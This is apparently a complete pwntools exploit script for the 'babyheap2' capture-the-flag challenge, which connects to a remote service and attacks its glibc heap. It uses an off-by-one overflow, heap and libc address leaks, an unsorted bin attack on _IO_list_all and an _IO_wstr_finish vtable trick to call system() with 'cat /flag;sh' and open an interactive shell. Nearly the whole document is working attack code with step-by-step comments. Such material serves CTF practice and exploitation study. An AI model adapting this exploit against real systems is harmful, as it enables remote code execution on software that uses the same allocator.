#!/usr/bin/env python
from pwn import *
import time, struct

REAL_LIBC = True

context.update(arch='amd64')
cwd = './'
bin = os.path.join(cwd, 'babyheap2')

if REAL_LIBC:
    p = remote('202.120.7.204', 127)
    #p = process(bin, cwd=cwd, aslr=False)
else:
    p = process(bin, cwd=cwd, aslr=False)

#p = process(bin, cwd=cwd, aslr=False)
time.sleep(1)


def cmd(cmdIdx):
    print p.recvuntil("Command: ")
    p.sendline(str(cmdIdx))

def alloc(size):
    cmd(1)
    print p.recvuntil('Size: ')
    p.sendline(str(size))
    print p.recvuntil('Allocated\n')

def win(size):
    cmd(1)
    print p.recvuntil('Size: ')
    p.sendline(str(size))

def update(slot, size, data):
    cmd(2)
    print p.recvuntil('Index: ')
    p.sendline(str(slot))
    print p.recvuntil('Size: ')
    p.sendline(str(size))
    print p.recvuntil('Content: ')
    p.send(data)
    print p.recvuntil('Updated\n')

def delete(slot):
    cmd(3)
    print p.recvuntil('Index: ')
    p.sendline(str(slot))
    print p.recvuntil('Deleted\n')

def view(slot, size, realsize):
    cmd(4)
    print p.recvuntil('Index: ')
    p.sendline(str(slot))
    print p.recvuntil("Chunk[%d]: " % slot)
    data = p.recv(realsize) #it will receive the signaled size in the heap actually, what we write here doesn't really matter at all
    print "Recvd:"
    #for d in data:
    #    print "%02x" % ord(d)
    #print "\n"
    return data

def heap_leak():
    data = view(1, 88, 88)
    kell = data[48:48+8]

    #for d in kell:
    #    print "%02X" % ord(d)

    leak = struct.unpack("<Q", kell)[0]
    base = leak - 0x190 - 0x60
    return base

def libc_leak():
    data = view(3, 88, 88)
    offs = 16
    kell = data[offs:offs+8]
    for i in kell:
        print "%02x" % ord(i)
    leak = struct.unpack("<Q", kell)[0]
    return leak

#gdb.attach(p)

alloc(40) #A0
alloc(40) #A1
alloc(24) #A2 - a chunk that A1 later swallows when realloced from fake unsorted bin as 88, allowing leak.
alloc(88) #A3
alloc(72) #A4
alloc(88) #A5
alloc(88) #A6
alloc(32) #A7 - needs to go on the same fastbin as A2; but A2's size is corrupted so has to be larger actually.
alloc(80) #A8

#we modify with an off-by-one write the LSB of the size field of A1. This gives us a fake chunk plus still the in_use bit.
update(0, 41, "B"*40 + "\xB1") #0xB0 == 176, where actual A5 starts.

#now with the new size A1 points right at A5 and it will be freed as an unsorted chunk, swallowing up A2 and A3 amd A4.
#since it is large enough, enstead of going onto the fastbin, it goes into the unsorted bin.
delete(1)

#Now we have to reallocate to 1 but with a large enough size request to swallow up 3.
alloc(88) #A1_again -> the rest went to the unsorted bin!

#A2 was proper, but unfortunately it was ruined by the calloc. So we need to rewrite it so it can be freed okay.
#instead of the original size, we write in +8. This makes it so that first p64 of A3 is where we can set the checked size
update(1, 48, 32*"C" + p64(0) + p64(49))

#not good yet, because we die with an invalid next size. so we have to update that too, that's gonna be inside A3.
#easiest to update that directly from A3 in fact.
update(3, 8, p64(33))

#add one more to the fastbin so there is a leakable pointer in A2 when it gets there
delete(7)

#well now we can delete A2, it will go into the fastbin as it should, it will point to A7, so we can leak it from A1 and get a heap leak.
delete(2)

#okay let's leak from A1 now
#view(1, 88, 88)
heap = heap_leak()
print "Heap base: 0x%016x" % heap

#ok, now we are going to need a libc leak. For this we have to put a chunk into the unsorted bin.
#but in fact, we already HAVE a chunk in the unsorted bin that we overlap, the split-off from before.
#so we can leak libc immediately.

#view(3, 88, 88)
unsorted = libc_leak()
if not REAL_LIBC:
    libc = unsorted - 0xb58 - 0x3C1000
else:
    libc = unsorted - 0xb58 - 0x3C1000 + 0x28000 #what's the diff? is this correct?
print "Libc base: 0x%016x" % libc
print "Unsorted: 0x%016x" % unsorted

#now we have an unsorted bin chunk that we can not only leak but also attack, so let's do unsorted bin attack to corrupt _IO_list_all ptr.

#this is _IO_list_all -> this -0x10 is what we are going to put into our bk.
if REAL_LIBC:
    write_target = libc + 0x39A500
else:
    write_target = libc + 0x3c2500

print "Write target: 0x%016x" % write_target

#so we are ready to do the unsorted bin attack b/c we can overwrite the chunk that was split off from A2 directly from A3.
#but first, we need to set up the conditions for it to work.

#we know that we have the overlapped unsorted bin guy's fd at A3 + 16.
#now we have to overwrite its bk (+24) so that when we do the alloc, this will result in the write_target overwritten with unsorted.
#we also have to preserve the prev_inuse bit so that we don't have a problem there w/ coallescing.

#in fact, here we could set the size of the request such that the chunk satisfies it, in this case we would get this back
#and survive the allocation.

#instead, we can de better: we can make the size too large, so that instead of immediately returning this,
#the heap manager will decide to try the next chunk on the unsorted bin, but first place this guy into
#the appropriate small bin.
update(3, 40, p64(64) + p64(96+8+1) + p64(unsorted) + p64(write_target-0x10) + p32(0xdeadbeef) + p32(0xf00dface))
#alloc(88)

#this causes a cascade of events.
#first, our chunk is taken from the unsorted bin and it's bk is written to the unsorted address, so _IO_list_all ptr is overwritten.
#next, we try to use this chunk, but it is larger than 88, no exact fit, so the chunk goes on the smallbin.
#since we have made the size 0x60+ (+8 here), we go onto smallbin[4].
#finally, the allocation routine will try to do more stuff of course but this will go to hell -> abort -> we hit our attack.

#the attack at this point is of course the run-of-the-mill attack against IO_list_all ptr.
#The idea is that when _IO_flush_all_lockp loops IO_list_all, after its first iteration, the fp->_chain field is the
#same offset as the offset from unsorted bin's address to smallbin[4]'s address. therefore the next FILE *fp that is inspected,
#is exactly our nice little chunk we just placed there.

#So the rest only concerns fixing all offsets so that all checks pass and allow us to call an arbitrary vtable pointer.

#that's the point of the p64(2) and P64(3) here.

update(3, 32+32+16, p64(64) + p64(96+8+1) + p64(unsorted) + p64(write_target-0x10) + p64(2) + p64(3) + "F"*32)

#A3 is smaller than all the offsets we need to fix, so we right the rest into A4, A5, and A8.
#all these satisfy conditions in _IO_wstr_finish, _IO_flush_all_lockp, and of course actually set the RIP as well.

#Next since 17.04 we have the vtable verification, so it has to go to an address within that range, so we use the _IO_wstr_finish trick.

if REAL_LIBC:
   vtable = libc +  0x395C10 - 0x18 #get _IO_wstr_finish as the abort function
else:
   vtable = libc +  0x3BDC90 - 0x18 #get _IO_wstr_finish as the abort function
   #vtable = libc + 0x3BDBD0 - 0x18 #get _IO_wstr_finish as the abort function
   #vtable = libc + 0x73250 - 0x18 #to get _IO_wstr_finish as the abort function

#Finally, _IO_wstr_finish has some conditions we have to satisfy too:
#It reads a pointer such that at +0x30 it needs to have a non-0 value but at +0 it needs to have what we pass to system.

#If these are all satisfied, then _IO_wstr_finish will take the jump target from our buffer so we go to system() and win.

#readPtr has to point to one of our chunks,
#such that at +0x30 it has non-0 but at +0 it has "/bin/sh\x00"
#so basically we fill in one of the chunks with this and point it there.
a8_chunk_address = heap + 0x230
readPtr = a8_chunk_address
#update(8, 56, "ls\x00" + 5*"\x00" + 40*"A" + p64(a8_chunk_address))
update(8, 56, "cat /flag;sh" + 36*"\x00" + p64(a8_chunk_address))
#update(8, 56, "/bin/sh\x00" + 40*"\x00" + p64(a8_chunk_address))

if REAL_LIBC:
    ripPtr = libc + 0x3F480 #this is system()
else:
    ripPtr = libc + 0x456A0

print "The vtable is: 0x%016x" % vtable

#we have to update A4 so that the prev_size field of 5 happens to be a readable pointer
update(4, 72, 2*p64(readPtr) + 8*"\x00" + p64(0) + 5*p64(readPtr))

#the 0 is necessary for the compare stuff in _IO_flush_all_lockp as were the 2 and 3 above.
update(5, 32+48+8, "C"*16 + p64(0) + p64(readPtr) + "D"*8 + p64(vtable) + "Z"*8 + p64(ripPtr) + "X"*8 + "Y"*8 + "N"*8)

print 'update done'

win(88)
p.interactive()
